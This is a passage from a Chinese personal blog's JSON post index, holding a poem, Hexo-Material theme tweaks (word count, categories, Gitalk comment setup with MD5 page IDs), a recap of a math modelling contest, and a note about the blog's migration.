DOM"},{"content":"黎明\n消失在地平线上\n我\n站在十字交错处\n一个人变成两个人，世界的范围变大了，孤单的范围变小了；两个人变成一个人，世界的范围变小了，孤单的范围变大了\n我却喜欢独自一人\n在时间里探寻着未来的颜色\n一人独行，孤单无助\n该从哪里找到答案\n因为一道身影始终伴随着我\n所以怀着满心的期待\n将颤抖的双手伸向不知何处\n想得到却总像被透明的玻璃挡住\n明明近在咫尺\n却又遥不可及\n无数次，无数次地回过头\n在悄静旷然的清晨\n在雨中晰黎的午后\n在风雪纷飞的黄昏\n在半月悬空的夜晚\n不断寻找着不知藏身何处的声音\n在光影交错间\n总是无法将那身影抓入手心\n孤单已成习惯\n一个人不够的话\n那就努力变强\n即便看不清夜空的颜色\n也要努力睁开眼\n只要不放弃\n一定可以一点一点地\n变得强大\n我将会强到无人可挡\n所以\n你要等着我\n想要看看你，亲手感受你的存在，想要和你去做一大堆事情\n明知道这是不可能实现的愿望\n却还是期盼着靠近你\n即便无法传递思念的心情\n即便近而不可及的距离分开了我们\n每次抬头仰望半月的夜空时\n想见你的心情就会愈加强烈\n起码现在\n在未雨绸缪处\n能够静静守护便足矣\n我们生来不是为了死，是为了活下去\n喜欢，就要倾注一切去追寻\n前方有无法预料的明天\n不必悲伤，不必难过\n因为有你，因为有明天\n因为心中有爱，所以不曾退缩\n今天是希望，明天是绝望\n那么，仅需紧握住今天的希望，将明天的绝望打破就行了\n在绝望来临之前\n还不是向世界妥协的时候\n还有你陪着我\n我将满怀绝望的思念\n拾起武器向前方挥去\nTo 妄想症\n","date":"2019-10-28T02:51:00+08:00","permalink":"https://blog.tinyume.com/2019/silver-sight/","title":"银色风景"},{"content":"适用于 Hexo-Material Introduction 看见 Material 的文章页太简陋了，去网上查了查好像没人搞这个，于是自己动手，添加字数统计插件后完美加上了字数统计和阅读时长预计，在添加分类标签时查阅了 Hexo 开发文档，发现list_categories()正好能满足需求（才怪咧\n这个方法打印出的分类标签会包含此分类的文章数，就像 Python2、闲谈4 这样，看上去极其不美观，一开始想用 ejs 格式化字符串，然而 ejs 似乎并没有格式化方法，然后翻了翻格式化的 npm 包，过于复杂选择弃掉，最后选用原生 js 去除数字，而后添加 Ant Design Icon，至此文章信息添加完成\n补充 好吧，发现了其实有如下的方法可以去除数字~~（hexo 的官方文档真垃圾~~\n1 2 3 4 5 \u0026lt;%- list_categories(post.categories, { show_count: false, class: \u0026#39;post_category\u0026#39;, style: \u0026#39;none\u0026#39; }) %\u0026gt; Inplement Installation 1 npm install --save hexo-wordcount 添加 HTML 元素 找到material/layout/post.ejs\n搜索\u0026lt;%- partial('_partial/post-content') %\u0026gt;\n在其上面一行添加以下代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;div class=\u0026#34;post-preface\u0026#34;\u0026gt; \u0026lt;span class=\u0026#34;post-preface-count\u0026#34;\u0026gt; \u0026lt;i\u0026gt;\u0026lt;img class=\u0026#34;post-preface-icons\u0026#34; src=\u0026#34;https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/img/icon/preface-count.svg\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;%= wordcount(partial(\u0026#39;_partial/post-content\u0026#39;)) %\u0026gt;字 \u0026lt;/span\u0026gt; \u0026lt;span class=\u0026#34;post-preface-minread\u0026#34;\u0026gt; \u0026lt;i\u0026gt;\u0026lt;img class=\u0026#34;post-preface-icons\u0026#34; src=\u0026#34;https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/img/icon/preface-minread.svg\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; 大约\u0026lt;%= min2read(partial(\u0026#39;_partial/post-content\u0026#39;)) %\u0026gt;分钟 \u0026lt;/span\u0026gt; \u0026lt;% if(is_post()){ %\u0026gt; \u0026lt;span class=\u0026#34;post-preface-categories\u0026#34;\u0026gt; \u0026lt;i\u0026gt;\u0026lt;img class=\u0026#34;post-preface-icons\u0026#34; src=\u0026#34;https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/img/icon/preface-categories-1.svg\u0026#34;\u0026gt;\u0026lt;/i\u0026gt; \u0026lt;%- list_categories(page.categories, { style: \u0026#39;p\u0026#39;, transform(str) { return titlecase(str); } }) %\u0026gt; \u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; 添加 CSS 样式 还是在material/layout/post.ejs\n随便找个适当的位置插入以下 Style 标签就行啦\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 \u0026lt;style\u0026gt; .post-preface { margin: 15px 0 0 4%; } .post-preface-count, .post-preface-minread, .post-preface-categories { border-radius: 10px; margin: auto 3px; padding: 5px 10px; font-size: 14px; color: white; display: inline-block; letter-spacing: 1px; } .post-preface-count { background-color: #ff4e6a; } .post-preface-minread { background-color: #ffaa73; } .post-preface-categories { background-color: #3cdc82; } .category-link { text-decoration: none; } .category-link:hover, .category-link:link, .category-link:visited, .category-link:active { color: white; } .post-preface-icons { filter: invert(100%); } \u0026lt;/style\u0026gt; 可能有人已经察觉到了这个 CSS 颜色反转滤镜，但我懒得改了（\n添加 JS 清洗字符串 依旧是material/layout/post.ejs\n将以下 JS 插入到刚才添加的 html 元素下方任意位置\n一定要在插入元素的下方，因为 html 是自上而下解释的\n1 2 3 4 5 \u0026lt;script\u0026gt; for (i = 0; i \u0026lt; document.getElementsByClassName(\u0026#34;category-link\u0026#34;).length; i++) { document.getElementsByClassName(\u0026#34;category-link\u0026#34;)[i].innerHTML = document.getElementsByClassName(\u0026#34;category-link\u0026#34;)[i].innerHTML.replace(/[0-9]/g, \u0026#39;\u0026#39;); } \u0026lt;/script\u0026gt; END\n顺便鬼灭之刃真香！\n","date":"2019-10-01T23:10:21+08:00","permalink":"https://blog.tinyume.com/2019/hexo-material-more-readable/","title":"让 Material 文章更加人性化"},{"content":"比赛时间 第一阶段：北京时间2019年4月19日下午20:00时——4月22日下午20:00时\n第二阶段：北京时间2019年5月17日下午20:00时——5月20日下午20:00时\nPreface 被数学老师叫去让我组织参加这个比赛，经历几个月最终募集好了三人团队~~（绝对不是我没有朋友，肯定是没什么人想参加，嗯~~\n今天发布了第二阶段证书的电子版，顺便写下了这篇博文\n我干了啥 充当队里的辣鸡程序猿，并使用了世界上最好的语言 Python 完成两场比赛的代码编写\n作为没有经过任何培训的一个专科(高二)组，基本很难和本科组、研究生组比肩，嘛，爽就完事了（\nDetail 队号: 1360\n相关地址: Source: https://github.com/iyume/code-tzmcm-12th\nWebPage: https://code.iyume.cc\n论文已在数学中国开放下载\n最终成绩 第一阶段\n分数: 55\n排名: 2075/3971\n简短评语: 排版有些问题，缺少对数据的预处理\n第二阶段\n分数: 41\n排名: 1311/1653\n简短评语: 文章结构不完整，摘要分析了文章思路，与正文契合点少，还需要突出自己的研究基础、主要方法、重要成果和创新点，这样更为突出论文成果；正文对赛题的分析不足，分析内容偏离赛题要求，对模型的可靠性、实用性分析不足。\n一些感想 别去搞建模！别去搞建模！别去搞建模！（逃\n嗯\u0026hellip;帮助还是挺大的，说实话当初不知道自己可以做到这个水平（反正还是个菜鸡就是了\n搞建模可能真的会秃头的吧，当时两个阶段的比赛时间都是开始半天学校，然后 1 天半蹲别人家里，剩下 1 天还要拿着笔记本去学校拼死肝代码（\n比赛里几乎每天都是半夜 2 点睡的（当然指我咯\n一开始选择的是 D 题，因为 D 题是专门为专科组设计的，理论上难度较低，是一道双向十字路口车流分析建模的问题，其实根本就看不懂啦，让人感觉这究竟是不是给人做的，然后本人发现 C 题是一道大数据，于是果断换了 C 题\nC 题主要就是人物画像，在车险行业中，绘出人物画像并将用户分类，还有利用卡方检验设计问卷等等\n咱的解题方法 Introduction 大数据作为时下最火热的IT行业的词汇，随之而来的数据仓库、数据安全、数据分析、数据挖掘等等围绕大数据的商业价值的利用逐渐成为行业人士争相追捧的利润焦点。随着大数据时代的来临，大数据分析也应运而生。\n——百度百科\n数据分析的几个步骤\nData Preprocessing（数据预处理） Data Mining（数据挖掘） Data Prediction（数据预测） 大数据分析与数学统计的区别有\n大数据分析不使用抽样 大数据分析侧重分析所有变量的相关性，而不再根据背景科学进行假设检验 Data Preprocess 若某列缺失值较少，则直接删除对应行 若某列缺失值较多，直接按照现有比例进行df.fillna 仔细考虑过到底该怎么填，虽然可能并不可靠，但也没别的好的替代方案\n针对数字，计算特征的中值、均值，将其替换为缺失值 数据量足够大的前提下，对目测不可靠的列，直接df.drop删除列 对时间列进行标准（格式）化 将是、否分别替换为1和0方便计算 特定行具有特定特征的空值（错误值），直接df.drop删除行 第一阶段 题目概述：计算续保概率\n首先计算实际续保概率，也就是不考虑任何因素影响下，所有用户总的续保概率\n再对各列进行分析，求出理论续保概率\n计算各列总的续保概率x_n 将用户分为几个近于均等的区间然后计算每个区间的续保概率 将每个列得到的所有续保概率求标准差w_n 最后以w_n作为权重、x_n代入加权平均数的计算公式求出了理论续保概率\n实际续保概率与理论续保概率相差0.0054，纳入误差允许范围，至此解题完毕\n第二阶段 题目概述：求出三个可靠性最大的列（即用户最愿意提供的信息）\n建立Cronbach α信度系数\n公式α=(k/(k-1))*(1-(∑Si^2)/ST^2)\nK：其中一个属性分类的种类总数 Si^2：一个属性中第 i 项的方差 ST^2：该属性的方差 其实这里搞砸了，计算并多次校验后出来信度的不仅全是负值，而且绝对值全位于 0 - 0.3 这个区间，而信度检验需要在 0.7 - 0.9 之间才是高信度的表现，当时已经无回天之力了（时间仅剩 2 小时），干脆死马当活马医，将计算出来的错误值取绝对并放大 3 倍来当数值用（\n揣揣不安看别人论文时，竟然发现咱的信度系数排列与别队差异不大，嘛，也算是运气嘛（ 没啥好讲的了，放两张优秀奖截图 后记 证书给寄到别的学校了qwq\u0026hellip;\n","date":"2019-09-13T19:35:40+08:00","permalink":"https://blog.tinyume.com/2019/2019-tzmcm-go-throught/","title":"TZMCM 比赛过程 \u0026 结果"},{"content":"适用于 Hexo-Material 坑 登录报错返回 URL：/?error=redirect_uri_mismatch\u0026amp;... 初始化留言板的时候 Validation Failed(422) 原因 Github OAuth Apps或本地未配置好导致没能正确访问Github Repo title字段太长导致返回 URL 超过长度限制 Solution 1. 链接Repo 先确认是否出现初始化 issues 提示，如没有，将OAuth Apps里的两个 URL 填入博客的主页地址\n再从主题 config 找到 gitalk 照如下形式填入配置\n1 2 gitalk_repo: hexo-blog #Repo名称 gitalk_owner: iyume #Owner名称 然后会出现只有 Hello World 文章可以正常加载 Gitalk 初始化并评论，中文标题文章无法初始化 Gitalk，再参照下面的方法\n2. 用MD5加密ID 地址：https://github.com/blueimp/JavaScript-MD5\n定位到 themes/material/layout/_widget/comment/gitalk/main.ejs\n导入MD5方法\n1 \u0026lt;script src=\u0026#34;https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/md5.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 然后在 gitalk 的实例化里修改 id 为\n1 id: md5(location.pathname) 最终配置如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;div id=\u0026#34;gitalk-container\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/gitalk.css\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/gitalk.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.jsdelivr.net/gh/iyume/static/hexo-blog/md5.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; var gitalk = new Gitalk({ clientID: \u0026#39;\u0026lt;%= theme.comment.gitalk_client_id %\u0026gt;\u0026#39;, clientSecret: \u0026#39;\u0026lt;%= theme.comment.gitalk_client_secret %\u0026gt;\u0026#39;, repo: \u0026#39;\u0026lt;%= theme.comment.gitalk_repo %\u0026gt;\u0026#39;, owner: \u0026#39;\u0026lt;%= theme.comment.gitalk_owner %\u0026gt;\u0026#39;, admin: [\u0026#39;\u0026lt;%= theme.comment.gitalk_owner %\u0026gt;\u0026#39;], id: md5(location.pathname), // facebook-like distraction free mode distractionFreeMode: false }) gitalk.render(\u0026#39;gitalk-container\u0026#39;) \u0026lt;/script\u0026gt; 巨坑（圈重点） 文章名不要带中文符号！！！ 否则回调url会将中文符号转换成英文导致报错！！！\n由于没有在网上看到类似的情况，当时用了半天才偶然发现回调 url 被诡异地改为英文符号。\nissue: https://github.com/gitalk/gitalk/issues/162\nGithub Manual: https://developer.github.com/apps/managing-oauth-apps/troubleshooting-authorization-request-errors/#redirect-uri-mismatch\n参考: https://www.izhongxia.com/posts/41249.html\n","date":"2019-09-13T10:44:47+08:00","permalink":"https://blog.tinyume.com/2019/gitalk-problems-handbook/","title":"整理部署 Gitalk 出现的坑"},{"content":"从 Typecho 转到 Hexo 了（其实是付不起 vps（小声\n关于以前的博客 Wordpress、Typecho~~（还有纯静态？~~，不过都弃坑了 托管于 HiFormance（目前已跑路），以前的博客文章并没有迁移到这里 :( 不久后又遇上 Aulerion 跑路，里面还有 30 美元 :( 这个惨痛的故事告诉了我，不要贪小便宜~~（是不是我用过的服务商都会关门跑路）~~ 另外这也是选择了 Hexo + Github Pages 的原因之一~~（可能 Github 也要关门跑路了）（笑~~ 本博客最初创立于 2017-11-03（大概），后面由于比赛各方面事情，然后就不了了之 主题使用 Viosey 的 Material\n关于LOGO 首页 LOGO 由本人进行设计，由三色绘恋中得出的灵感，采用灰色、紫水晶色、橘色进行配色并完成了这个 LOGO，未经本人授权，禁止在任何地方使用\n仰望半月的夜空 这不是什么正儿八经的技术博客，以后也不会正经就是了 也不会有什么固定或频繁地更新博文 这个博客涉及但不限于轻小说、日漫、ADV、资讯、技术、个人感想 从侧边栏选择你喜欢的分类看就行了啦 如果你也是博主并想与我 PY，请前往留言板或者选择直接联系我 一般晚上收到邮件通知就会回复，周末或节假日必回\n关于我\n另外由于高三课程繁忙，可能并不会很快对评论进行回复，望海涵！\n#PrayForKyoani\n","date":"2019-07-26T17:17:15+08:00","permalink":"https://blog.tinyume.com/2019/2019-about-old-blog/","title":"现充都爆炸吧 !"}]